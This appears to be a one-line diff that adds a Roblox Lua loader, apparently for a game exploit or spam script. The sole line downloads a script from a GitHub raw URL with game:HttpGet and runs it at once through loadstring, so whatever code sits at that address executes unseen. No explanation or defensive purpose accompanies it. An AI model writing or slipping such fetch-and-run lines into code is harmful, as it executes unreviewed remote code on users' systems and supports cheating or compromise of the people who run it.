@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/huss-valley-spam7-hs723rtlhd4pck.lua"))()
